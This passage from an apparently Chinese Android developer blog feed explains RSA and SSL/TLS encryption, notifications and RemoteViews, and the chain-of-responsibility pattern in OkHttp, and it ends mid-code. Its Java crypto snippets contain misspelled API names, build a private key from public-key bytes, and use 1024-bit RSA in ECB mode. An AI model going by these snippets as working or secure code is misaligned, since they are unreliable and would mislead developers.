<li>获取N的欧拉函数值-&gt;整数R</li>  <li>随机获取一个小与R并与之互质的整数E,计算出E的反模元素D</li>  <li>公钥是(N,E),私钥是(N,D)</li></ul><h2 id="rsa的原理">RSA的原理</h2><ul>  <li>欧拉定理 两个互质的正整数,A和N,N的欧拉函数为P,则A的P次方除以N余1  </li>  <li>费马小定理(RSA算法核心) 因为质数P的欧拉函数为P-1,所以一个整数A和一个质数N互质时,A的N-1次方除以N余1  </li>  <li>反模元素 两个互质的正整数.A和N,则一定存在一个整数B,使得A乘B除以N余数为1  </li></ul><h2 id="实现-v4">实现</h2><h3 id="定义常量">定义常量</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> KEY_SIZE=<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> RSA=<span class="string">"RSA"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MODE=<span class="string">"RSA/ECB/PCKS1Padding"</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里注意RSA的加密填充方式,需要两端保持一致。</p><p>在Adrioid中默认使用的是<code>RSA/None/NoPadding</code>,在Java中使用的是<code>RSA/None/PCKS1Padding</code>。</p><h3 id="创建密钥">创建密钥</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">KeyPairGenerator rsa = KeyPairGenerator.getInstance(RSA);</span><br><span class="line">rsa.initialize(KEY_SIZE);</span><br><span class="line">KeyPair keyPair = rsa.generateKeyPair();</span><br><span class="line">Key publicKey = keyPair.getPublic();</span><br><span class="line"><span class="keyword">byte</span>[] publicKeyEncoded = publicKey.getEncoded();</span><br><span class="line">Key privateKey = keyPair.getPrivate();</span><br><span class="line"><span class="keyword">byte</span>[] privateKeyEncoded = privateKey.getEncoded();</span><br></pre>      </td>    </tr>  </table></figure><h3 id="把字节数组转换为key">把字节数组转换为Key</h3><p>公钥会以字节数组的形式公开，接收方需要把字节数据转化为公钥。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//公钥公开的方式为X509</span></span><br><span class="line">KeySpec KeySpec = <span class="keyword">new</span> X509EncodedKeySpec(publicKeyEncoded);</span><br><span class="line">PublicKey publicKey = keyFactory.generatePublic(keySpec);</span><br><span class="line"><span class="comment">//私钥公开的方式为PKCS8</span></span><br><span class="line">KeySpec keySpec = <span class="keyword">new</span> PKCS8EncodedKeySpec(publicKeyEncoded);</span><br><span class="line">PrivateKey privateKey = keyFactory.generatePrivate(keySpec);</span><br></pre>      </td>    </tr>  </table></figure><h3 id="加解密">加解密</h3><p>通常使用公钥加密,使用私钥解密.还是使用<code>Cipher</code>类。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Cipher cipher=Cipher.instance(MODE);</span><br><span class="line"><span class="comment">//使用公钥加密</span></span><br><span class="line">cipher.init(Cipher.ENCRIPT_MODE,publicKey);</span><br><span class="line">cipher.doFinal();</span><br><span class="line"><span class="comment">//使用私钥解密</span></span><br><span class="line">cipher.init(Cipher.DECRIPT_MODE,privateKey);</span><br><span class="line">cipher.doFinal();</span><br></pre>      </td>    </tr>  </table></figure><h1>SSL</h1><p>安全套接字（Secure Socket Layer，SSL）协议是Web浏览器与Web服务器之间安全交换信息的协议，提供两个基本的安全服务：鉴别与保密。</p><ul>  <li>鉴别 可选的客户端认证及强制的服务端认证</li>  <li>保密 双方在连接时定义好加密方式,所有传递内容都会加密.</li></ul><p>SSL是间与应用层与TCP层.应用数据经过SSL层加密并加上SSL头传输给TCP层。</p><h2 id="ssl通信流程">SSL通信流程</h2><ul>  <li>握手 握手是在两端连接后数据传输前的协议行为,通过三次握手确定双方的身份,双方的加密方式,以及确定密钥.这个握手过程是通过RAS加密及身份证书完成的.  </li>  <li>加密通信 完成握手协议手,双方就按确定的加密方式以对称加密的方式对数据进行加密  </li></ul><h2 id="握手协议">握手协议</h2><ul>  <li>客户端发送至服务器 一个会话ID,自身SSL版本.一个32位随机数.一自身支持的密码套件列表.一个hello.</li>  <li>服务器接收后会根据客户端提供的列表选择一个密码套件,确定与客户端之间的加密方式</li>  <li>服务器发送至客户端 会话ID,SSL版本,一个32位随机数,一个密码套件.一个servieHello.及自己的证书.</li>  <li>客户端收到证书后可以对证书进行验证.然后生成一个32位随机数.这样总共就有三个随机数了.根据服务端确定的加密方式用这三个随机数生成密钥.然后从证书中获得服务端的公钥对第三个随机数加密</li>  <li>客户端发送至服务器 加密的第三个随机数.</li>  <li>服务器收到加密的随机数后使用私钥解密,然后使用三个随机数生成密钥.</li>  <li>服务器发送至客户端 准备完成,可以开始加密通信</li></ul><h2 id="证书">证书</h2><p>证书是一台服务器对外提供的一个身份证明.需要通过可靠的第三方认证机构(CA)来发布。</p><p>一个数字证书通常有以下几项：</p><ul>  <li>证书持有者的公钥</li>  <li>证书的发布机构</li>  <li>CA的签名</li>  <li>签名摘要的算法</li></ul><h2 id="证书的验证">证书的验证</h2><p>一般的浏览器都会有CA根证书,含有所有CA的公钥</p><ul>  <li>CA验证 CA根证书中找到不证书的发布机构</li>  <li>CA签名摘要验证 使用CA的公钥来解密签名摘要,如果解不开说明证书不对</li>  <li>CA签名验证 使用公钥解密签名.然后使用签名摘要算法进行签名摘要,比对解密手的签名摘要.如果不同说明签名被更改</li>  <li>证书过期验证 实现了在线证书状态协议(OCSP)的客户端可以在线查询证书是否过期</li></ul><h1>TSL</h1><p>TLS 1.0是IETF（Internet Engineering Task Force，Internet工程任务组）制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本，可以理解为SSL 3.1</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7f8aa6cf/">http://home.meng.uno/articles/7f8aa6cf/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Android开发中常见的几种加密方式

 * MD5
 * BASE64
 * AES
 * DES
 * RSA
 * SSL/TSL

MD5加密
MD5英文全称Message-Digest Algorithm 5,全称消息算法摘要,是一种不可逆加密方式

特点
 * 压缩性：任意长度的数据，算出的MD5值长度都是固定的。
 * 容易计算：从原数据计算出MD5值很容易。
 * 抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。
 * 强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。

因为其特点,MD5加密通常
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="数据加密" scheme="http://home.meng.uno/tags/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Android通知及RemoteViews</title>
    <link href="http://home.meng.uno/articles/6a064a82/"/>
    <id>http://home.meng.uno/articles/6a064a82/</id>
    <published>2017-02-27T08:53:59.000Z</published>
    <updated>2020-12-02T02:03:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1>通知</h1><h2 id="通知创建和使用的流程">通知创建和使用的流程</h2><ul>  <li>创建Notification.Builder的实例</li>  <li>通过Builder来设置通知的相关属性,并通过builder()方法来获取设置好的通知</li>  <li>获取NotificationManager来发送通知.</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Notification.Builder builder = <span class="keyword">new</span> Notification.Builder(getApplicationContext());</span><br><span class="line">builder.setContentTitle(<span class="string">"这是标题"</span>);</span><br><span class="line">Notification build = builder.build();</span><br><span class="line">NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">nm.notify(<span class="number">0</span>,build);</span><br></pre>      </td>    </tr>  </table></figure><p>官方的兼容包中提供了兼容工具类,用来在不同版本下创建和使用兼容的通知:</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">NotificationCompat.Builder builder = <span class="keyword">new</span> NotificationCompat.Builder(getApplicationContext());</span><br><span class="line">builder.setContentTitle(<span class="string">"这是标题"</span>);</span><br><span class="line">Notification nofitication = builder.build();</span><br><span class="line">NotificationManagerCompat.from(getApplicationContext()).notify(<span class="number">0</span>,Notification);</span><br></pre>      </td>    </tr>  </table></figure><p>使用<code>NotificationCompact</code>和<code>NotificationManagerCompat</code>两个类来提供兼容性.实际上底层的实现还是一样的。</p><p><code>NotificationManagerCompat</code>通过静态方法from(Context Context)创建了一个自身的实例.实例中通过参数Context获取了一个<code>NotificationManager</code>,实际上通知还是通过它来发送。</p><p>实际上这两个工具类内部会根据应用运行机器的版本来创建对应的实现类来提供兼容性。</p><h2 id="通知的设置">通知的设置</h2><p>通知是通过Builder来设置的。常见的设置如下：</p><ul>  <li>设置标题 setContentTitle(CharSequence)</li>  <li>设置文字内容 setContentText(CharSequence)</li>  <li>设置副文字 setSubContextText(CharSequence)</li>  <li>设置大图标 setLargeIcon(Bitmap) 不设置时默认为应用图标</li>  <li>设置小图标 setSmallIcon(int) 参数为图片资源Id</li>  <li>设置颜色 setColor(int color) 参数为RGB值</li>  <li>设置声音 setSound</li>  <li>设置震动 setVibrate</li>  <li>设置闪灯 setLight(int,int,int) 第一个int为颜色的资源id,第二个和第三个是闪灯开启和关闭的时间,单位为毫秒</li>  <li>设置点击后是否自动取消 setAutoCancel(boolean)</li></ul><h3 id="进度条">进度条</h3><p>从4.1开始通知里自带进度条.通过<code>setProgress(in max,int progress,boolean indeterminate)</code>来设置进度</p><ul>  <li>max 进度最大值</li>  <li>progress 当前进度</li>  <li>indeterminate 是否是无限循环 true表示无限循环进度条,不需要进度及最大值.false反之</li></ul><p>当进度条加载完毕后可以能过<code>setProgress(0,0,false)</code>来隐藏进度条。</p><h2 id="消息发送">消息发送</h2><p>发送通知需要一个id和一个Notification。通过NotificationManager发送到远程的NotificationService上.用Notification里的数据更新远程的UI。</p><p>使用notify(int id,Notification notify)可以不断的更新同一个通知.另外此方法可以有个重载的方法可以设置一个Tag。</p><h3 id="id">ID</h3><p>id需要自己设置,一个Id对应一个通知.NotificationService收到Notification后会根据Id去查找对应的View.如果不存在则创建一个。如果存在则更新UI也就是说如果id相同时,后续的通知会把之前的通知替换掉,如果id不同时会弹出多个通知。</p><h2 id="pendingintent">PendingIntent</h2><p>PendingIntent用与处理通知的交互事件(也就是点击事件).PendingIntent表示的是一个待定的意图。</p><p>可以用来开启一个Activity,Service或广播接收者,它是对Intent的包装.对外部提供这个Intent.通知被点击时系统会按照PendingIntent设置的方法及Intent设置的目标去开启对应的Activity,Service或广播接收者。</p><p>创建PendingIntent的方法如下：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">PendingIntent.startActivity(Context context,<span class="keyword">int</span> requestCode,Intent intent,<span class="keyword">int</span> flag);</span><br><span class="line">PendingIntent.startService(Context context,<span class="keyword">int</span> requestCode,Intent intent,<span class="keyword">int</span> flag);</span><br><span class="line">PendingIntent.startBroadcast(Context context,<span class="keyword">int</span> requestCode,Intent intent,<span class="keyword">int</span> flag);</span><br></pre>      </td>    </tr>  </table></figure><p>所需要的参数都一样,startActivity还可以额外带一个bundle参数。</p><ul>  <li>Context 启动所需上下文.实际上传递到外部的是应用的Application.所以在点击通知时哪怕应用没启动,也可以开启对应的组件.</li>  <li>requestCode 请求码,自定义</li>  <li>intent 启动所需组件的intent,因为Context是Application.所以启动Activity需要NEW_TASK标识.</li>  <li>flag PendingIntent的标识</li></ul><p>对与更新同一个id的通知而言,这两个没有作用,不管PendingIntent是否有变化,始终都是新的通知替换掉原来的。</p><p>当每次都使用不同的id来弹出多个通知时,这些flag才会发生作用.这里需要涉及PendingIntent的匹配问题。</p><p>两个PendingIntent匹配指的是requestCode相同并且PendingIntent内部的intent都匹配。</p><p>当两个intent内部的ComponentName和intent-filter相同,这两个intent就算是匹配的.ComponentName相同指的是这个intent希望开启的组件是相同的。</p><p>多个通知的PendingIntent如果不匹配是互不干扰的.如果是匹配的.则根据flag有不同的处理方式。</p><ul>  <li>FLAG_ONE_SHOT PendingIntent只执行一次,也就是说多个含有匹配的PendingIntent的通知,只要有一个被点击了,那么其它的就点击无效.通知里如果还含有其它的PendingIntent,还是可以被点击的.  </li>  <li>FLAG_NO_CREAT 如果PendingIntent不存在时并不创建新的实例,而是返回null.这个很少用.  </li>  <li>FLAG_CANCEL_CURRENT 如果PendingIntent已经存在,则取消前者,创建新的实例以保持数据为最新.多个含有匹配PendingIntent的通知,只有最新的可以被点击,其它的点击无效.  </li>  <li>FLAG_UPDATE_CURRENT 多个含有PendingIntent的通知都会更新其Intent中的Extra数据与最新的通知中保持一至.  </li></ul><h2 id="action">Action</h2><p>通知的点击交互被称为Action。 通知自身的点击交互设置方法是  <code>setContentIntent(PendingIntent)</code>。</p><p>在新版本中通知可以添加不同的按钮来对应不同的Action,添加Action的方法有两种：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">builer.addAction(Action)</span><br><span class="line">builer.addAction(<span class="keyword">int</span> iconId,CharSequence title,PendingIntent intent)</span><br></pre>      </td>    </tr>  </table></figure><p>实际上都是添加Action实例.区别在与Action是否自己来构造。Action在通知上显示为一个带图标的文字按钮.必须的三个参数如下：</p><ul>  <li>IconId 图标的资源id</li>  <li>Title 按钮的文字</li>  <li>PendingIntent 按钮的点击处理</li></ul><h2 id="style通知样式">Style通知样式</h2><p>在4.0版本后通知可以被拉伸,通知可以设置不同的扩展样式。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">builer.setStyle(NotificationCompat.style);</span><br></pre>      </td>    </tr>  </table></figure><p>系统提供了四种默认样式</p><ul>  <li>MediaStyle 媒体播放器样式.可以最多提供5个Action,用与后台播放媒体文件：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">builer.setStyle(<span class="keyword">new</span> NotificationCompat.MediaStyle()</span><br><span class="line">                .setMediaSession(MediaSession.Token));</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>BigPictureStyle 大图样式.可以附加一张图片,扩展显示：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">buider.setStyle(<span class="keyword">new</span> NotificationCompat.BigPictureStyle()</span><br><span class="line">                .bigPicture(Bitmap));</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>InboxStyle 文字式表样式,可以以列表的形式显示最多5行的文字</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">builer.setStyle(<span class="keyword">new</span> NotificationCompat.InboxStyle()</span><br><span class="line">                .setLine(CharSequence)</span><br><span class="line">                .setLine(CharSequence));</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>BigTextStyle 多文字内容.下拉显示全部文字</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">buider.setStyle(<span class="keyword">new</span> NotificationCompat.BigTextStyle()</span><br><span class="line">                .bitText(CharSequence));</span><br></pre>      </td>    </tr>  </table></figure><h1>RemoteViews</h1><p>RemoteViews是Android提供的一种远程服务,可以跨进程显示及更新UI,通知及桌面小部件就是基与它封装的。</p><p>其核心是跨进程传递数据.把UI的布局及对其View的操作封装到RemoteViews里,传递给其它进程.其它进程收到RemoteViews后调用RemoteViews的方法创建或更新UI并显示。</p><h2 id="remoteviews的原理">RemoteViews的原理</h2><p>RemoteViews本身并不是个View.它是个Pacelable,是个可以跨进程传递的一个数据.它携带了UI的布局及对应的数据。 其它进程收到这个RemoteViews后会在其进程中根据这个布局inflat出对应的View.然后根据RemoteViews里的属性反射设置到对应的View上,然后根据设置点击监听.监听的处理就是调用对应的PendingIntent。 因为是跨进程,所以无法直接操作View,所以系统把对view的一个操作定义为Action对象.Action对象本身也是个Pacelable,所以可以跨进程.其封装了操作View的数据.远程进程遍历所有的Action并执行其apply方法通过反射更新View。  向先前说的设置view的属性,设置点击监听,都是一个Action。</p><h2 id="remoteviews的创建">RemoteViews的创建</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">RemoteViews remoteview=<span class="keyword">new</span> RemoteViews(String packageName,<span class="keyword">int</span> layoutId);</span><br><span class="line">如果通知需要使用自定义UI可以通过创建RemoteView实现</span><br><span class="line">builer.setCustomContentView(RemoteViews);</span><br><span class="line">或</span><br><span class="line">builer.setCustomBigContentView(RemoteViews);</span><br></pre>      </td>    </tr>  </table></figure><p>packageName表示的是客户端的包名,layoutId表示布局Id。</p><h2 id="remoteviews的设置">RemoteViews的设置</h2><p>RemoteViews对View的操作是在远程进行的.所以客户端只是封装了操作.通过RemoteViews提供的一系列set方法,RemoteViews把所有设置都封装成Action保存到集合中。</p><ul>  <li>    <p>设置属性参数为view的id及属性值如：</p>    <figure class="highlight java">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line">setText(<span class="keyword">int</span> id,CharSequence text)</span><br><span class="line">setColor(<span class="keyword">int</span> Id,<span class="keyword">int</span> color)</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><ul>  <li>    <p>设置属性参数为view的id,方法名及属性值如</p>    <figure class="highlight java">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line">setBitmap(<span class="keyword">int</span> id,String methodName,Bitmap bitmap)</span><br><span class="line">setBoolean(<span class="keyword">int</span> id,String methodName,<span class="keyword">boolean</span> value)</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><ul>  <li>    <p>单个View设置点击事件</p>    <figure class="highlight java">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line">setOnClickPendingIntent(<span class="keyword">int</span> id,PendingIntent intent);</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><ul>  <li>集合View设置点击事件 需要 <code>setPendingIntentTemplate</code>及<code>setOnClickFillIntent</code>两个方法结合使用。</li></ul><p>因为Action操作View是通过反射的.所以不能使用自定义控件,只能用有限的系统控件。</p><h3 id="layout">Layout</h3><ul>  <li>FramgLayout</li>  <li>LinearLayout</li>  <li>RelativeLayout</li>  <li>GridLayout</li></ul><h3 id="view">View</h3><ul>  <li>Button</li>  <li>ImageView</li>  <li>TextView</li>  <li>ProgressBar</li>  <li>ImageButton</li>  <li>ListView</li>  <li>GridView</li>  <li>Chronometer</li>  <li>AnalogClock</li>  <li>ViewFlipper</li>  <li>StackView</li>  <li>AdapterViewFlipper</li>  <li>ViewStub</li></ul><h2 id="发送remoteviews到其它进程">发送RemoteViews到其它进程</h2><p>可以使用任何IPC方式把本地设置好的RemoteViews发送到其它进程 是通过NotificationManager发送到系统进程,小部件是通过AppWidgetManager发送到系统进程.都是通过Binder机制。</p><p>因为RemoteViews是个Parcelable,所以可以通过很多系统提供的方式来传递,如Intent,Message,或其它IPC方式。</p><h2 id="远程的ui操作">远程的UI操作</h2><p>远程收到RemoteViews后通过调用其 <code>apply()</code>或<code>reApply()</code> 方法创建或更新UI。</p><h3 id="apply">Apply</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">apply</span><span class="params">(Context context,ViewGroup parent,OnClickHandler handler)</span></span>;</span><br></pre>      </td>    </tr>  </table></figure><p>其中parent是父布局,这个方法会创建一个View并根据Action设置属性,返回这个设置好的View：</p><ul>  <li>创建布局 从RemoteViews里获取布局文件的id,根据id填充出对应的View.因为是根据ID来填充布局的,所以必须保证远程进程能根据id获取到布局文件。 系统是根据RemoteViews里的包名来获取包内的布局文件的,同一个应用内不同的线程也可以根据id来获取布局文件.但如果是两个不同的应用是不能根据id来获取布局文件的。  </li>  <li>设置属性 RemoteViews会调用    <code>perfomApply(View view,ViewGroup parent,OnClickHandler handler)</code>来设置填充好的View 其实就是遍历Action.调用其 <code>apply()</code> 方法操作View.反射设置属性,或通过OnClickHandler设置点击交互。</li>  <li>把填充并设置好的View添加到父布局中。</li></ul><h3 id="reapply">ReApply</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reapply</span><span class="params">(Context context, View v, OnClickHandler handler)</span></span>;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>reApply()</strong> 方法只是更新UI,也是调用 <strong>perfomApply()</strong> 方法。</p><p>如果是两个不同的应用间使用RemoteViews,是不能使用 <strong>apply()</strong> 方法来创建UI的。</p><p>这时需要两边约定好布局文件,远程端在需要创建UI时在使用本地的布局文件填充View.然后调用 <strong>reApply()</strong> 方法来更新UI,最后再添加到父布局。</p><h1>总结</h1><p>通知是由RemoteViews来实现的,通过Notification类来封装一个RemoteViews。</p><p>设置不同的style实际上是设置RemoteViews里的layoutId. 通过NotificationManager的 <strong>notify()</strong> 方法发送到系统的NotificationService中。</p><p>系统的NotificationService里维护着各种Notification,实际上一个id对应着一个RemoteViews。</p><p>系统在自己的进程里创建和更新通知.当通知被点击时,在系统进程中会根据PendingIntent来启动指定的Activity,Service,及BroadcasterReceiver。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/6a064a82/">http://home.meng.uno/articles/6a064a82/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      通知
通知创建和使用的流程
 * 创建Notification.Builder的实例
 * 通过Builder来设置通知的相关属性,并通过builder()方法来获取设置好的通知
 * 获取NotificationManager来发送通知.

1
2
3
4
5


Notification.Builder builder = new Notification.Builder(getApplicationContext());
builder.setContentTitle(&quot;这是标题&quot;);
Notification build = builder.build();
NotificationM
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="RemoteViews" scheme="http://home.meng.uno/tags/RemoteViews/"/>
    
  </entry>
  
  <entry>
    <title>责任链模式及OkHttp实现</title>
    <link href="http://home.meng.uno/articles/7c56e6ba/"/>
    <id>http://home.meng.uno/articles/7c56e6ba/</id>
    <published>2017-02-25T08:37:13.000Z</published>
    <updated>2020-12-02T01:59:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1>责任链模式</h1><p>责任链模式是对一个事件的处理方法,所有能对事件进行处理的对象按顺序形成一个链表.事件经过链表中每个处理对象轮流处理.如果有返回值.则返回也是顺着这条链表反向返回.这个链表是先进后出模式.</p><ul>  <li>在现实中的责任链模型之一就是网络连接.对与程序猿而言,七层或五层的网络连接模型是肯定知道的.</li></ul><p>当一个网络请求发出时,需要经过应用层-&gt;传输层-&gt;网络层-&gt;连接层-&gt;物理层</p><p>收到响应后正好反过来,物理层-&gt;连接层-&gt;网络层-&gt;传输层-&gt;应用层</p><p>在请求经过各层时,由每层轮流处理.每层都可以对请求或响应进行处理.并可以中断链接,以自身为终点返回响应</p><ul>  <li>另一个现实模型就是Web服务器的请求缓存</li></ul><p>一个请示从客户端发送到Web服务器需要经过客户端-&gt;中间服务器-&gt;反向代理-&gt;Web端缓存(如Redis)-&gt;Web数据库</p><p>除了Web数据库是请求的点外,中间所有层都可以缓存数据.如果有缓存时会终止请求,以自身为终点返回数据.</p><p>如果途经的层没有缓存,则会在收到下一级的返回的数据时对数据进行缓存.然后返回上一层.</p><p>在设计模式中,负责链模式就是对这种顺序处理事件的行为的抽象,通过接口来定义处理事件的方法.顺序分发/处理事件.</p><ul>  <li>每个责任人实现相同的接口,处理一个事件对象</li>  <li>让事件对象责任人之间顺序传递</li>  <li>事件的处理结果的返回是逆序的</li>  <li>责任链中的每个责任人都可以有权不继续传递事件,以自身为终点处理事件返回结果</li></ul><h1>OkHttp中的责任链模式</h1><p>在<code>Okhttp</code>中,<code>Intercepter</code>就是典型的责任链械的实现.它可以设置任意数量的<code>Intercepter</code>来对网络请求及其响应做任何中间处理.比如设置缓存,<code>Https</code>的证书验证,统一对请求加密/防串改,打印自定义Log,过滤请求等.</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Intercepter</span></span>&#123;</span><br><span class="line">    <span class="function">Response <span class="title">chian</span><span class="params">(Chian chian)</span></span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这个接口很简单,拿到<code>Chain</code>对象.最后返回个<code>Response</code>,那这个对象是什么鬼??</p><p>它有两个重要的方法  <code>public Request getQuest()</code>及<code>public Response process(Request quest)</code> 拿到请求及设置请求拿到响应. 一般的实现是先拿到请求.然后对请求做一番蹂躏,然后  <code>process</code>一下,拿到<code>Response</code>,折腾一下.然后<code>return</code>掉</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> Response chain(Chain chain)&#123;</span><br><span class="line">    Requset quest = chian.getRequset()</span><br><span class="line">    ooxx(request);</span><br><span class="line">    Response response = chain.process(quest);</span><br><span class="line">    xxoo(response);</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>或许它不知道,<code>Resquse</code>其实是被上家ooxx过的,<code>Respnse</code>也是被下家xxoo过的.</p><p>具体的实现可以去看一下源码,我这里就写一下自己理解的超简单的实现</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Okhttp</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> List&lt;Intercepter&gt; mIntercepters=<span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"><span class="keyword">private</span> Request mRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> mIndex;</span><br><span class="line"><span class="keyword">private</span> Callback mCallback;</span><br><span class="line"><span class="keyword">private</span> Chain mChain=<span class="keyword">new</span> Chain();</span><br><span class="line"><span class="keyword">private</span> Intercepter mNetIntercepter =<span class="keyword">new</span> Intercepter() 